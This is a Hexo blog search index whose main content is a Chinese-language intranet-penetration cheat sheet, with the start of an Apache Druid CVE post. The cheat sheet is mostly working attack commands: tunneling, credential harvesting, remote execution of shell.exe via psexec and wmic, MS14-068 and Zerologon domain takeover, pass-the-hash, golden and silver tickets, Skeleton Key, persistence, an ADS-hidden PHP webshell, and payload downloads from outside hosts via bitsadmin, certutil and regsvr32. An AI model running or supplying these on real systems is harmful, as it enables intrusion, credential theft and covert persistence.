{"meta":{"title":"h00ls","subtitle":"","description":"","author":"h00ls","url":"http://example.com","root":"/"},"pages":[{"title":"404","date":"2019-08-05T08:41:10.000Z","updated":"2019-11-24T01:38:10.735Z","comments":true,"path":"404/index.html","permalink":"http://example.com/404/index.html","excerpt":"","text":""},{"title":"文章分类","date":"2019-10-07T12:13:17.000Z","updated":"2019-10-07T12:14:14.090Z","comments":true,"path":"categories/index.html","permalink":"http://example.com/categories/index.html","excerpt":"","text":""},{"title":"文章分类","date":"2019-10-07T12:20:11.000Z","updated":"2019-10-07T12:20:55.520Z","comments":true,"path":"tags/index.html","permalink":"http://example.com/tags/index.html","excerpt":"","text":""},{"title":"rank","date":"2020-08-29T06:30:59.350Z","updated":"2020-01-08T15:27:24.142Z","comments":false,"path":"rank/index.html","permalink":"http://example.com/rank/index.html","excerpt":"","text":"AV.initialize(\"O6HOeMU3xTx19Bq6JnggI4Lc-gzGzoHsz\", \"B7TclJbpoA4JjOmugYsavhyp\"); var time=0 var title=\"\" var url=\"\" var query = new AV.Query('Counter'); query.notEqualTo('id',0); query.descending('time'); query.limit(15); query.find().then(function (todo) { for (var i=0;i"}],"posts":[{"title":"内网渗透","slug":"内网渗透","date":"2021-03-02T08:18:03.000Z","updated":"2021-03-22T00:55:41.263Z","comments":true,"path":"2021/03/02/内网渗透/","link":"","permalink":"http://example.com/2021/03/02/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/","excerpt":"","text":"内网渗透对内网渗透做了个总结，会持续更新、补充、修改…… 隧道、代理、端口转发代理proxychains只支持TCP，不支持UDP和ICMP等 与nmap使用的时候，会出现问题。需要在配置文件中，注释掉proxy_dns windows端：https://github.com/shunf4/proxychains-windows.git proxifier适用windows 隧道搭建判断协议出网dns 12nslookup 8.8.8.8 # windowsdig 8.8.8.8 # linux http 12curl www.baidu.com # windowswget www.baidu.com icmp 1ping www.baidu.com tcp 1telnet www.baidu.com 搭建隧道收集于：https://xz.aliyun.com/t/7701 网络层ICMP隧道 icmpsh 能通过ICMP协议反弹cmd，功能单一，反弹回来的cmd极不稳定，不推荐使用 icmptunnel 创建虚拟网卡通过ICMP协议传输网卡流量，基于ICMP隧道的vpn，需要root权限，动静极大，不推荐使用 pingtunnel tcp、udp、socks5 over ICMP，速度快，连接稳定，跨平台，client模式不需要管理员权限即可正常使用，推荐使用 传输层TCP隧道、UDP隧道 netcat 网络工具中的瑞士军刀，不多介绍，linux系统一般自带 powercat powershell版的netcat socat 具有记录转发流的功能，方便查看转发内容，需要安装 netsh windows系统自带的网络配置工具 lcx 端口转发工具 NATBypass 一款lcx在golang下的实现,更好的跨平台，更完善的文档 iox 端口转发 &amp; 内网代理工具，功能类似于lcx/ew，简化了命令行参数，支持UDP流量转发，更好的跨平台。缺点：不支持监听指定IP，默认监听0.0.0.0:port，会增大暴露风险 应用层由于应用层协议极多，对应的隧道工具也很多，我们常用来做隧道的协议一般是DNS、HTTP、SSH、SOCKS等 dnscat2 不仅可以创建DNS隧道，更是C2 https://github.com/iagox86/dnscat2 dnscat2-powershell dnscat2的powershell客户端 dns2tcp TCP over DNS,即通过DNS隧道转发TCP连接 iodine IPv4 over DNS，即通过DNS隧道转发IPv4数据包 reGeorg SOCKS over HTTP,即通过HTTP隧道转发SOCKS Neo-reGeorg 重构版reGeorg，提高稳定性和可用性，避免特征检测，更新活跃 https://github.com/L-codes/Neo-reGeorg reDuh TCP over HTTP,即通过HTTP隧道转发TCP连接，隧道不稳定 Tunna TCP、SOCKS over HTTP,即通过HTTP隧道转发TCP连接和SOCKS，隧道不稳定 ABPTTS TCP over HTTP,即通过HTTP隧道转发TCP连接,数据加密，可自定义HTTP数据，对抗特征检测十分优秀，创建的隧道十分稳定，比较遗憾的是支持的web脚本类型只有aspx和jsp EarthWorm 十分方便的多级SOCKS代理，已经永久停止更新 Termite EarthWorm的升级版，已经永久停止更新 Venom Venom是一款为渗透测试人员设计的使用Go开发的多级代理工具。 ssocks 正向和反向的socks工具，可执行文件的大小很小 s5.go go语言编写的socks服务工具，良好的跨平台特性 ssh http://www.zsythink.net/archives/2450 -C 压缩传输，提高传输速度-f 后台执行数据传输-N 建立静默连接-g 允许远程主机连接本地用于转发的端口-L 本地端口转发-R 远程端口转发-D 动态转发，即SOCKS代理-p 指定ssh连接端口 配置文件 /etc/ssh/sshd_config AllowAgentForwarding yesAllowTcpForwarding yesGatewayPorts yes 本地转发： 12ssh -CNfg -L 127.0.0.1:7777:114.114.114.114:9999 root@192.168.1.1#ssh客户端监听127.0.0.1:7777, 将收到的tcp数据包通过连接到192.168.1.1的ssh隧道转发到ssh服务端，再由服务端转发到114.114.114.114:9999 远程转发： 12ssh -CNfg -R 127.0.0.1:7777:114.114.114.114:9999 root@192.168.1.1#ssh服务端监听127.0.0.1:7777, 将收到的tcp数据包通过连接到192.168.1.1的ssh隧道转发到ssh客户端，再由ssh客户端转发到114.114.114.114:9999 动态转发： 12ssh -CNfg -D 127.0.0.1:7777 root@192.168.1.1# ssh客户端监听127.0.0.1:7777开启socks服务，将收到的socks数据包通过连接到192.168.1.1的ssh隧道转发到ssh服务端，再由ssh服务端转发到目标地址 关闭系统日志记录 提权后关闭系统日志记录 1工具：https:&#x2F;&#x2F;github.com&#x2F;hlldz&#x2F;Invoke-Phant0m.git 信息收集 查看当前用户及权限 12whoami &#x2F;userwhoami &#x2F;priv 查看在线用户 12query user | quser# 避开管理员 查看当前用户属组 1net user [username] 查看主机名、工作组/域、操作系统信息 12345systeminfonet config workstationwmic OS get Caption, CSDVersion, OSArchitecture, Version 补丁信息 1234WMIC.exe qfe get HotFixID &gt;&gt;&gt;&gt; 查询可提权网站：http:&#x2F;&#x2F;bugs.hacking8.com&#x2F;tiquan&#x2F;&gt;&gt;&gt;&gt; 使用工具查询：https:&#x2F;&#x2F;github.com&#x2F;AonCyberLabs&#x2F;Windows-Exploit-Suggester.git 杀软信息 1wmic &#x2F;namespace:\\\\root\\securitycenter2 path antivirusproduct GET displayName 搜索域控 12WMIC.exe ntdomainnet time &#x2F;domain 收集敏感信息： 123# 敏感文件收集dir &#x2F;a &#x2F;s &#x2F;b d:\\&quot;*.txt|*.xml|*.mdb|*.sql|*.mdf|*.eml|*.pst|*conf*|*bak*|*pwd*|*pass*|*login*|*user*&quot; 1234567891011121314# 账号密码收集findstr &#x2F;si pass *.inc *.config *.ini *.txt *.asp *.aspx *.php *.jsp *.xml *.cgi *.bakfindstr &#x2F;si userpwd *.inc *.config *.ini *.txt *.asp *.aspx *.php *.jsp *.xml *.cgi *.bakfindstr &#x2F;si password *.inc *.config *.ini *.txt *.asp *.aspx *.php *.jsp *.xml *.cgi *.bakfindstr &#x2F;si login *.inc *.config *.ini *.txt *.asp *.aspx *.php *.jsp *.xml *.cgi *.bakfindstr &#x2F;si user *.inc *.config *.ini *.txt *.asp *.aspx *.php *.jsp *.xml *.cgi *.bakfindstr &#x2F;si pwd *.inc *.config *.ini *.txt *.asp *.aspx *.php *.jsp *.xml *.cgi *.bakfindstr &#x2F;si username *.inc *.config *.ini *.txt *.asp *.aspx *.php *.jsp *.xml *.cgi *.bak 查看目标主机共享 12net view \\\\target-ip # 是否用空密码访问权限，如果知道用户名和密码copy shell.exe \\\\ip\\c$\\windows\\temp\\shell.exe 执行后门 12345psexec \\\\ip -u userName -p userPass cmd.exe c:\\windows\\temp\\shell.execsript.exe wmiexec.vbs &#x2F;cmd domainName userName userPass &quot;ipconfig&quot;wmic &#x2F;node:ip &#x2F;user:userName &#x2F;password:userPass process call create &quot;C:\\Windows\\temp\\shell.exe&quot; 收集用户口令 windowsmimikatz、LaZagne Xshell凭证 远程连接凭证：https://github.com/3gstudent/List-RDP-Connections-History.git linux123find .&#x2F; -type f -regex &#39;.*\\.txt|.*\\.xml|.*\\.php|.*\\.jsp|.*\\.conf|.*\\.bak|.*\\.js|.*\\.inc|.*\\.htpasswd|.*\\.inf|.*\\.ini|.*\\.log|.*\\.new&#39; | xargs egrep &quot;user|uname|pass|pwd|admin&quot;cat &#x2F;root&#x2F;.bash_history|grep -Ei -C 2 &#39;ssh|mysql|ftp|scp|su|root|passwd&#39; 权限提升查找具有特殊权限的二进制文件 123find / -user root -perm -4000 -print 2&gt;/dev/nullfind / -perm -u=s -type f 2&gt;/dev/nullfind / -user root -perm -4000 -exec ls -ldb &#123;&#125; \\; Windows提权项目https://github.com/Ascotbe/Kernelhub Windows本地提权(CVE-2021-1732)https://github.com/KaLendsi/CVE-2021-1732-Exploit.git Linuxsudo 提权12sudo -l # 查看查看当前⽤户允许执⾏的提权命令。sudo -u root &#x2F;tmp&#x2F;tiquan.sh suid提权12345# 查看 suid 的文件find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null# 查看 guid 的文件find &#x2F; -perm -g&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null 特殊命令提权https://gtfobins.github.io/ 定时任务提权查看计划任务，找到有修改权限的计划任务脚本 12ls -l &#x2F;etc&#x2F;cron*more &#x2F;etc&#x2F;crontab 内核提权比较常用的提权漏洞 CVE-2016-51951(脏牛提权) CVE-2019-14287(sudo 溢出提权) 使用自动化脚本检测 12https:&#x2F;&#x2F;github.com&#x2F;rebootuser&#x2F;LinEnum https:&#x2F;&#x2F;github.com&#x2F;mzet-&#x2F;linux-exploit-suggester 域环境1234567891011121314151617net user 本机用户net user &#x2F;domain 域用户net user username &#x2F;domain 获取指定用户信息net user username newpassword &#x2F;domain 修改域用户密码net group &#x2F;domain 查看域工作组net group &quot;domain admins&quot; &#x2F;domain 查看域管理员列表net group &quot;enterprise admins&quot; &#x2F;domain 企业管理员列表net group &quot;domain controllers&quot; &#x2F;domain 查看域控制器net localgroup administrators &#x2F;domain 登录本机的域用户net time &#x2F;domain 判断域控net view 查看域内机器列表net start 查看当前运行的服务net session 查看当前的会话 定位域控 123456789101、DNS定位域控nslookup&gt;&gt;set type&#x3D;all&gt;&gt;test.com2、nltest &#x2F;dclist:test.com3、net time &#x2F;domain4、端口：389(ldap)、53(dns) 主机存活探测 1和上面一样 获取域控ms14-068把普通域用户提升到域控权限，补丁：KB3011780 方式一、 https://github.com/gentilkiwi/kekeo 1kekeo.exe &quot;exploit::ms14068 &#x2F;domain:test.com &#x2F;user:username &#x2F;password:password &#x2F;ptt&quot; &quot;exit&quot; 方式二、 mimikatz，这时候并不需要管理员权限。 ms14-068：https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068 1234whoami &#x2F;user #获取sidms14-068.exe -u [域用户]@[所在域] -s [域用户SID] -p [域用户密码] -d [域控地址] #制作凭证kerberos::purge #清除原有凭证mimikatz.exe &quot;kerberos::ptc c:[上面的凭证]&quot; exit &#x2F;&#x2F;导入新的凭证 可以在msf中的meterpreter中直接使用 使用psexec远程连接即可 就可以直接添加域管理员 12net user username password &#x2F;add &#x2F;domainnet group &quot;Domain admins&quot; username &#x2F;add &#x2F;domain GPP 存在的意义：在比较大一点的环境中，我们会经常遇到这样的情况，由于电脑的批次不一样，或IT人员流动的问题，造成电脑的本地管理员密码不一致，当我们需要登录到本地管理员的时候，往往会不知道本地管理员密码，虽然我们可以通过进PE的办法破解密码，但如果电脑比较多，那么这将是一个讨厌的工作。如果是域环境，我们可以组策略的方式批量修改计算机的本地管理员密码。 利用：实质上就是一种信息收集的方式，可能存在密码重用 直接访问\\\\king.com\\SYSVOL\\king.com\\Policies\\&#123;0FD0DF94-3629-4ECA-B858-6F0C60B3A821&#125;\\User\\Preferences\\Groups 使用脚本解密： 12345678910111213141516171819202122232425262728293031323334353637383940# define helper function that decodes and decrypts passwordfunction Get-DecryptedCpassword &#123; [CmdletBinding()] Param ( [string] $Cpassword ) try &#123; #Append appropriate padding based on string length $Mod = ($Cpassword.length % 4) switch ($Mod) &#123; &#x27;1&#x27; &#123;$Cpassword = $Cpassword.Substring(0,$Cpassword.Length -1)&#125; &#x27;2&#x27; &#123;$Cpassword += (&#x27;=&#x27; * (4 - $Mod))&#125; &#x27;3&#x27; &#123;$Cpassword += (&#x27;=&#x27; * (4 - $Mod))&#125; &#125; $Base64Decoded = [Convert]::FromBase64String($Cpassword) # Make sure System.Core is loaded [System.Reflection.Assembly]::LoadWithPartialName(&quot;System.Core&quot;) |Out-Null #Create a new AES .NET Crypto Object $AesObject = New-Object System.Security.Cryptography.AesCryptoServiceProvider [Byte[]] $AesKey = @(0x4e,0x99,0x06,0xe8,0xfc,0xb6,0x6c,0xc9,0xfa,0xf4,0x93,0x10,0x62,0x0f,0xfe,0xe8, 0xf4,0x96,0xe8,0x06,0xcc,0x05,0x79,0x90,0x20,0x9b,0x09,0xa4,0x33,0xb6,0x6c,0x1b) #Set IV to all nulls to prevent dynamic generation of IV value $AesIV = New-Object Byte[]($AesObject.IV.Length) $AesObject.IV = $AesIV $AesObject.Key = $AesKey $DecryptorObject = $AesObject.CreateDecryptor() [Byte[]] $OutBlock = $DecryptorObject.TransformFinalBlock($Base64Decoded, 0, $Base64Decoded.length) return [System.Text.UnicodeEncoding]::Unicode.GetString($OutBlock) &#125; catch &#123; Write-Error $Error[0] &#125;&#125;Get-DecryptedCpassword &quot;6s0v9qCdP8OcbP/xlB1XbNUdTDeC5NnDT196ZKinPsE&quot; # 修改成相应的密码 1powershell -executionpolicy bypass -file Get-GPPPassword.ps1 修复建议 使用PsPasswd批量修改域内主机本地管理员密码 CVE-2020-1472 域内提权直接指向域控，so cool！ 工具 重置域控用户名为空：https://github.com/dirkjanm/CVE-2020-1472 执行各种命令工具(sudo pip3 install .)：https://github.com/SecureAuthCorp/impacket 恢复域控密码：https://github.com/risksense/zerologon 影响范围 Windows Server 2008 R2 for x64-based Systems Service Pack 1Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation)Windows Server 2012Windows Server 2012 (Server Core installation)Windows Server 2012 R2Windows Server 2012 R2 (Server Core installation)Windows Server 2016Windows Server 2016 (Server Core installation)Windows Server 2019Windows Server 2019 (Server Core installation)Windows Server, version 1903 (Server Core installation)Windows Server, version 1909 (Server Core installation)Windows Server, version 2004 (Server Core installation) 将域控密码设置为空 123python3 cve-2020-1472-exploit.py &lt;域控机器名&gt; &lt;域控IP&gt;python3 cve-2020-1472-exploit.py WIN-03OO218S5B8 192.168.0.4 通过 Dcsync 查看密码hash 123secretsdump.py &lt;域&gt;&#x2F;&lt;域控机器名&gt;\\$@&lt;域控IP&gt; -just-dc -no-passsecretsdump.py king.com&#x2F;WIN-03OO218S5B8\\$@192.168.0.4 -just-dc -no-pass 通过wmiexec.py获取shell 1234wmiexec.py king.com&#x2F;administrator@&lt;域控IP&gt; -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 king.com&#x2F;administrator@192.168.0.4或者wmiexec.py king.com&#x2F;administrator@&lt;域控IP&gt; -hashes aad3b435b51404eeaad3b435b51404ee:0d546438b1f4c396753b4fc8c8565d5b king.com&#x2F;administrator@192.168.0.4 恢复密码 工具：https://github.com/risksense/zerologon 在上面执行的cmd下执行如下命令 12345678910# SHELL reg save HKLM\\SYSTEM system.savereg save HKLM\\SAM sam.savereg save HKLM\\SECURITY security.saveget system.saveget sam.saveget security.savedel &#x2F;f system.savedel &#x2F;f sam.savedel &#x2F;f security.saveexit 然后利用 secretsdump 解析保存在本地的NT hash 记录下上面获取的数据，接下来使用上面提到的工具恢复hash 1python3 reinstall_original_pw.py DC_NETBIOS_NAME DC_IP_ADDR &lt;ORI_HASH&gt; 测试用空密码访问，已经失效了 横向移动SPN cobalt strike 1shell setspn -T test.com -Q *&#x2F;* 探测域内存活的相关服务 导出票据 1mimikatz.exe &quot;kerberos::list &#x2F;export&quot; 由于加密类型是RC4_HMAC_MD5，Kerberos协议第四步TGS-REP将会返回用服务帐户的NTLM密码哈希加密的票据。使用字典进行暴力破解：（2.txt为字典） https://github.com/nidem/kerberoast 1python tgsrepcrack.py 2.txt &quot;1-40a10000-linghuchong@MSSQLSvc~College-DS1~1433-COLLEGE.COM.kirbi&quot; PTH产生哈希传递原因：https://www.freebuf.com/articles/terminal/80186.html. 微软于2014年5月打了KB2871997补丁用来防范哈希传递，但是Administrator账号(SID为500)是例外的，使用该账户的NTLM Hash依然可以进行哈希传递 WMI(回显)1exploit&#x2F;windows&#x2F;local&#x2F;wmi wmic12345wmic &#x2F;node:target_ip &#x2F;user:username &#x2F;password:password process call create c:\\shell.batwmic &#x2F;node:target_ip &#x2F;user:username &#x2F;password:password process call create &quot;cmd.exe &#x2F;c net user &amp;&amp; ipconfig&quot;wmic &#x2F;node:target_ip &#x2F;user:username &#x2F;password:password process call create &quot;cmd.exe &#x2F;c shell.exe&quot; impacketshttps://github.com/SecureAuthCorp/impacket.git 1python wmiexec.py -hash 000000000000000000000000000000:[ntlm hash] test&#x2F;administrator@target_ip &quot;whoami&quot; psexec需要远程系统开启ADMIN$ 在启动psexec建立连接，远程系统上会安装相应 的服务，因此会留下痕迹 123psexec \\\\target_ip -u amdinistrator -p password cmd 返回终端psexec \\\\target_ip -u administrator -p password -s cmd &#x2F;c &quot;query user&quot; IPC利用135、445口开放 123456789101112net user \\\\ip\\ipc$ password &#x2F;user:username上传木马：copy shell.exe \\\\ip\\c$\\windows\\temp\\shell.exe命令执行psexec \\\\ip -u username -p password whoamicscript wmicexec.vbs &#x2F;cmd domain_name username password whoami# 服务 wmic &#x2F;node:ip &#x2F;user:username &#x2F;password:password process call create &quot;c:\\windows\\temp\\shell.exe&quot; 计划任务schtasks 1 at 1 启动服务12345678910# 创建一个服务sc \\\\target_ip create WindowsUpdates binPath&#x3D; &quot;cmd.exe &#x2F;c start net user&quot;# 执行和删除sc \\\\target_ip start WindowsUpdatessc \\\\target_ip delete WindowsUpdates# 指定administrator账户创建一个 adminsec 的服务sc \\\\target_ip create adminsec binPath&#x3D; &quot;c:\\shell.exe&quot; obj&#x3D;&quot;adminsec\\administrator&quot; password&#x3D; adminsecsc \\\\target_ip start adminsec 权限维持注册表启动项12345678# 查看当前的启动项REG query &quot;HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run# 添加一个启动项REG add &quot;HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run&quot; &#x2F;v [启动名字] &#x2F;d &quot;C:\\Windows\\Temp\\shell.exe&quot; &#x2F;f# 删除启动项REG delete &quot;HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run&quot; &#x2F;v [启动名字] &#x2F;f Windows计划任务利用前提 必须通过其他手段拿到本地或者域管理账号密码 若在横向渗透过程中，要保证当前机器能netuse远程到目标机器上 目标机器开启了taskscheduler服务 1234567891011#远程schtasks &#x2F;create &#x2F;s target_ip &#x2F;u &quot;administrator&quot; &#x2F;p &quot;password&quot; &#x2F;RL HIGHEST &#x2F;f &#x2F;tn &quot;windowsUpdate&quot; &#x2F;windows&#x2F;tmp&#x2F;bit.txt &#x2F;sc DAYLY &#x2F;mo 1 &#x2F;ST 20:15 ??# 本地schtasks &#x2F;create &#x2F;tn &quot;360&quot; &#x2F;tr C:\\Windows\\Temp\\360.exe &#x2F;sc DAILY &#x2F;st 10:00# 查找schtasks &#x2F;query &#x2F;s target_ip &#x2F;U &quot;administrator&quot; &#x2F;P &quot;password&quot; | findstr &quot;windowsUpdates&quot;# 删除schtasks &#x2F;delete &#x2F;F &#x2F;tn WindowsUpdates &#x2F;s target_ip &#x2F;U &quot;administrator&quot; &#x2F;P &quot;password&quot; 多地登陆管理员账号查看注册表 1\\HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\TerminalServer\\fSingleSessionPerUser 1是不允许多地远程， 0,是允许，03以上的系统基本上默认都是为1不允许所以这里就需要我们更改这个 隐藏文件文件属性隐藏隐藏文件，这样只是简单的隐藏文件，在文件夹选项中勾选显示隐藏的文件、文件夹或驱动器就能显示隐藏文件 1attrib +h eval.php 打开电脑文件夹选项卡，取消隐藏受保护的操作系统文件勾选，把隐藏文件和文件夹下面的单选选择显示隐藏的文件、文件夹和驱动器。 1attrib +s +a +h +r eval.php 利用ADS隐藏1echo ^&lt;?php @eval($_POST[&#39;cmd&#39;]); ?^&gt; &gt; index.php:hidden.jpg 这样子就生成了一个不可见的shell hidden.jpg，常规的文件管理器、type命令，dir命令、del命令发现都找不出那个hidden.jpg的。 使用notepad index.php:hidden.jpg 修改文件 或者 使用dir /r 查看文件。删除文件，直接删除index.php即可。 驱动级文件隐藏使用工具：Easy File Locker 如果你在网站目录未查找到相关文件，且系统目录存在存在以下文件： 1234c:\\WINDOWS\\xlkfs.datc:\\WINDOWS\\xlkfs.dllc:\\WINDOWS\\xlkfs.inic:\\WINDOWS\\system32\\drivers\\xlkfs.sys 清除 12341、查询服务状态：sc qc xlkfs2、停止服务：net stop xlkfs # 服务停止以后，经驱动级隐藏的文件即可显现3、删除服务：sc delete xlkfs4、删除系统下面文件，重启系统，确认服务已经被清除 SSP(Security Support Provider)原理 https://uknowsec.cn/posts/notes/%E5%9F%9F%E6%B8%97%E9%80%8F-%E5%9F%9F%E7%BB%B4%E6%9D%83.html 利用 123将mimikatz下的mimilib.dll 拷贝到 C:\\windows\\system32的目录下添加Security Packages 重启成功，如果有用户成功登录到当前系统中,会在 c:\\windows\\system32 目录下生成一个用于记录登账账号密码的 kiwissp.log 文件 黄金票据Golden Ticket是通过伪造的 TGT（TicketGranting Ticket），因为只要有了高权限的TGT，那么就可以发送给TGS换取任意服务的ST。可以说有了金票就有了域内的最高权限。 条件 12341、域名称2、域的SID值3、域的KRBTGT账户密码HASH4、伪造用户名，可以是任意的 MSF 中使用 12345678910111213141516171819202122232425# 在msf中先steal_token一个域管理员的进程，然后才可以执行下面的命令。一开始使用&#96;impersonate_token&#96;获取的域管理员身份不起作用。meterpreter &gt; steal_token 1964Stolen token with username: KING\\administratormeterpreter &gt; dcsyncdcsync dcsync_ntlm meterpreter &gt; dcsync_ntlm krbtgt[+] Account : krbtgt[+] NTLM Hash : 16a358115102a4351ee2240d7f983b23[+] LM Hash : 8968fb93cc3e6143a62930984b756f62[+] SID : S-1-5-21-1100079753-1400930603-3000301551-502[+] RID : 502# 生成黄金票据，会存放在本地的攻击机系统中golden_ticket_create -u [任意用户名] -d [所在域] -s [SID去除最后三个] -k [krbtgt的ntlm哈希] -t [保存文件的路径和名字]meterpreter &gt; golden_ticket_create -u administrator -d king.com -s S-1-5-21-1100079753-1400930603-3000301551 -k 16a358115102a4351ee2240d7f983b23 -t golden.kiribi# 删除目标机器其他票据meterpreter &gt; kerberos_ticket_listmeterpreter &gt; kerberos_ticket_purge# 注入票据meterpreter &gt; kerberos_ticket_use golden.kiribi # 直接使用 白银票据主要是制作ST票据，不会KDC交流，直接发送到服务确认。每次制造的票据只能用于访问一个服务。 域管理员上收集信息： 12345# 获取域控sidwhoami &#x2F;user# 获取 ntlm 哈希、和主机名mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; &quot;exit&quot;&gt;log.txt 在域用户上执行，会自动将票据注入。 123456789mimikatz.exe &quot;kerberos::golden &#x2F;domain:king.com &#x2F;sid:S-1-5-21-1100079753-1400930603-3000301551 &#x2F;target:WIN-8VSIF64RC10.king.com &#x2F;service:cifs &#x2F;rc4:&lt;1bd736c7b3fc68abd61863a15704a661 &#x2F;user:secquan &#x2F;ptt&quot;参数如下：domain: 域sid： 域管理员的sidtarget： 域控主机名+域service：要伪造服务票据rc4： 是 administrator$ 的ntlm哈希，不是 administrator 的哈希，也就是server的哈希user： 随便指定一个用户 只要记录下域管理员的 主机名、服务的哈希、域管理员的sid，下次按需生成服务白银票据。 检测域内密码修改工具：https://github.com/Jumbo-WJB/Misc-Windows-Hacking 只需要文件夹中的HookPasswordChange.dll和Invoke-ReflectivePEInjection.ps1 1234# 导入包powershell.exe -ExecutionPolicy Bypass -File Invoke-ReflectivePEInjection.ps1# 然后修改密码，密码就会被保存在 C:\\windows\\temp\\password.txt Skeleton KeySkeleton Key被安装在64位的域控服务器上,支持Windows Server2003到Windows Server2012 R2,能够让所有域用户使用同一个万能密码（默认密码为”mimikatz”）进行登录，现有的所有域用户使用原密码仍能继续登录，注意并不能更改用户权限。 由于 Skeleton Key 是被注入到 lsass.exe 进程的，所以它只存在于内存中，如果域控制器重启，注入的 Skeleton Key 将会失效。 利用 1234567891011# 在域控主机上运行 mimikatzprivilege::debugmisc::skeleton# 在域主机上net use \\\\[域控主机名].king.com\\c$ mimikatz &#x2F;user:administrator@king.com这时候就能查看域控主机dir \\\\WIN-8VSIF64RC10.king.com\\c$ 域内委派攻击委派功能只有服务账号和主机账号才有委派功能，普通域内用户或域控是没有的。 非约束委派攻击所需工具：https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1 原理：用户需要访问主机1上的HTTP服务，而HTTP服务需要请求其他主机的SQLServer数据库，但是主机1并不知道用户是否有权限访问SQLServer，这时HTTP服务会利用用户的TGT的身份去访问KDC，如果用户有权限访问SQLServer服务才能访问成功。这就是非约束委派的过程。实际上就是将用户自己的TGT委派了一个服务账号，该服务访问任何服务都会带上用户的TGT，因此会再服务机器上留下用户的TGT。 在域控上执行 1234567891011# 导入工具Set-ExecutionPolicy Bypass -Scope Process -ForceImport-Module .\\PowerView.ps1# 查看非约束委派的用户Get-NetUser -Unconstrained -Domain king.com# 查看非约束委派的计算机Get-NetComputer -Unconstrained -Domain king.com把已经控制的主机用户设置为非约束委派，并且服务被其他主机访问的情况下才可继续利用 在域内主机上用本地管理员登录，执行一下命令 123# 使用mimikatz导出主机中的所有凭证，找到如下的administrator的TGT凭证privilege::debug sekurlsa::tickets &#x2F;export 将凭证添注入 1kerberos::ptt xxx.kirbi 约束委派攻击非约束性委派（Unconstrained Delegation），服务账号可以获取某用户的TGT，从而服务账号可使用该TGT，模拟用户访问任意服务 约束性委派，服务账号只能获取用户委派的服务的票据，从而服务账号可使用该票据，只能访问指定的服务 文件传输powershell123456# 文件上传powershell (New-Object System.Net.WebClient).UploadFile(&#39;http:&#x2F;&#x2F;10.11.0.4&#x2F;upload.php&#39;, &#39;important.docx&#39;)# 文件下载powershell -exec bypass -c (new-object System.Net.WebClient).DownloadFile(&#39;http:&#x2F;&#x2F;192.168.111.1:8080&#x2F;test&#x2F;putty.exe&#39;,&#39;C:\\Users\\linghuchong\\Desktop\\Tools\\putty1.exe&#39;)putty1.exe bitsadmin1bitsadmin &#x2F;transfer n http:&#x2F;&#x2F;domain&#x2F;file c:\\windows\\temp\\shell.exe 此工具还能够用下载并执行后门 12345678#创建一个下载任务：bitsadmin &#x2F;create backdoor#添加文档：bitsadmin &#x2F;addfile backdoor %comspec% %temp%\\cmd.exe#设置下载成功之后要执行的命令：bitsadmin.exe &#x2F;SetNotifyCmdLine backdoor regsvr32.exe &quot;&#x2F;u &#x2F;s &#x2F;i:https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;3gstudent&#x2F;SCTPersistence&#x2F;master&#x2F;calc.sct scrobj.dll&quot;#执行任务：bitsadmin &#x2F;Resume backdoor certutil123certutil.exe -urlcache -split -f http:&#x2F;&#x2F;192.168.111.1:8080&#x2F;test&#x2F;putty.execertutil.exe -urlcache -split -f http:&#x2F;&#x2F;192.168.111.1:8080&#x2F;test&#x2F;putty.exe delete #删除缓存putty.exe 可以实现绕过杀软 123456# 编码要上传的exe到txt格式CertUtil -encode frpc.exe frpc.txt# 下载txt文件certutil.exe -urlcache -split -f frpc.txt的地址# 将txt文件编码成exe文件CertUtil -decode frpc.txt frpc.exe nc12nc -lvvp 8888 &gt; fileNamenc 1.1.1.1 8888 &lt; fileName 安全审计LynisLynis是一款Unix系统的安全审计以及加固工具，能够进行深层次的安全扫描，其目的是检测潜在的时间并对未来的系统加固提供建议。这款软件会扫描一般系统信息，脆弱软件包以及潜在的错误配置。 golismeroGoLismero是一款开源的安全测试框架。目前，它的测试目标主要为网站。该框架采用插件模式，实现用户所需要的功能。GoLismero默认自带了导入、侦测、扫描、攻击、报告、UI六大类插件。通过这些插件，用户可以对目标网站进行DNS检测、服务识别、GEOIP扫描、Robots文件扫描、目录暴力枚举等几十项功能。通过插件方式，GoLismero还可以调用其他工具，如Exploit-DB、PunkSPIDER、Shodan、SpiderFoot、theHarvester。但已经许久不更新了。 chkrootkit下载地址：http://www.chkrootkit.org/download/ Rootkit是一个特殊的恶意软件，它可隐藏自身以及指定的文件、进程、网络、链接、端口等信息。Rootkit可通过加载特殊的驱动修改系统内核，进而达到隐藏信息的目的。Rootkit的三要素就是：隐藏、操纵、收集数据。不同的操作系统会有不同的Rootkit，Linux系统中的Rootkit就被称为LinuxRootkit。 12345678# 下载wget ftp:&#x2F;&#x2F;ftp.pangeia.com.br&#x2F;pub&#x2F;seg&#x2F;pac&#x2F;chkrootkit.tar.gz# 编译make sense# 运行.&#x2F;chkrootkit","categories":[],"tags":[{"name":"内网渗透专栏","slug":"内网渗透专栏","permalink":"http://example.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B8%93%E6%A0%8F/"}]},{"title":"Apache Druid未授权命令执行(CVE-2021-25646)","slug":"Apache-Druid未授权命令执行-CVE-2021-25646","date":"2021-02-05T08:32:31.000Z","updated":"2021-02-05T08:37:00.983Z","comments":true,"path":"2021/02/05/Apache-Druid未授权命令执行-CVE-2021-25646/","link":"","permalink":"http://example.com/2021/02/05/Apache-Druid%E6%9C%AA%E6%8E%88%E6%9D%83%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-CVE-2021-25646/","excerpt":"","text":"Apache Druid未授权命令执行(CVE-2021-25646)漏洞描述Apache 